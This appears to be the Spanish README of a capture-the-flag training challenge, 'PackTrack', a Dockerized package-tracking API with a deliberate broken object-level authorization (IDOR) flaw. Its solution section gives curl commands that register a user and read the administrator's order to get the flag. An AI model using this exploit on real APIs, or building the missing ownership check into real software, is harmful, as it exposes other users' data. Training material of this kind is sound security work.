# PackTrack

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Easy                         |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Un servicio de seguimiento de paquetes expone una API REST. Los usuarios se registran, obtienen un token Bearer y pueden consultar sus pedidos. Sin embargo, el endpoint `GET /api/orders/<id>` no verifica si el pedido pertenece al usuario autenticado.

## Vulnerabilidad

**Broken Object Level Authorization (BOLA / IDOR)**

El endpoint `/api/orders/<id>` autentica al usuario (verifica el token) pero no autoriza el acceso al objeto concreto. Cualquier usuario autenticado puede consultar cualquier pedido por su ID numerico, incluyendo el pedido #1 que pertenece al administrador.

## Solucion

```bash
# 1. Registrarse y obtener token
TOKEN=$(curl -s -X POST http://localhost:8080/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Acceder al pedido #1 (del administrador)
curl -s http://localhost:8080/api/orders/1 \
  -H "Authorization: Bearer $TOKEN"

# Respuesta contiene el flag en el campo "details"
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
